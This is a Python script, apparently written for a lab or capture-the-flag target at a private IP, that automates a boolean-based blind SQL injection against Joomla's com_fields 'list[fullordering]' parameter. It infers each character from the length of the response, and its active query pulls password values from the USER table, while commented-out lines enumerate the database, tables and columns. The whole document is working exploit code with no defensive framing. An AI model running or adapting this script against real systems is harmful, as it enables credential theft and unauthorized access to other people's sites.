#!/usr/bin/env python3
import requests
import string
import urllib
import sys

def getConcat(st):
    output = "CONCAT("
    for ch in st:
        output += f"CHAR({ord(ch)}),"
    output = output[:-1] + ")"
    return output




def test(st):
    orig = "http://10.10.215.138/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE%20WHEN%20(TEST)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)"
    r = requests.get(orig.replace("TEST", st))
    l = len(r.text)
    if l > 3530:
        return True
    else:
        return False


print("should be false: ", test("""char(42)=char(41)"""))

skip = False

import threading
def skipper():
    global skip
    while True:
        input()
        skip = True


threading.Thread(target=skipper).start()




for w in range(1,175): # word[w]
    print()
    skip = False
    word = f"{w}: " 
    for i in range(1, 50):
        found = False
        if skip:
            break
        for ch in range(33,127):
            if skip:
                break
            found = True
            #tst = f"SUBSTRING((DATABASE()),{i},1)=char({ch})"
            #tst = f"SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {w},1),{i},1)=char({ch})" 
            #tst = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={getConcat('USER')} LIMIT {w},1),{i},1)=char({ch})" 
            tst = f"SUBSTRING((SELECT PASSWORD FROM USER LIMIT {w},1),{i},1)=char({ch})" 
            print(f"{tst} : {word}    - {chr(ch)}" ,end="\r")
            if test(tst):
                found = True
                word += chr(ch)
                break
        if not found:
            print("NOT FOUND")
            break
        
print("\n\ndone")


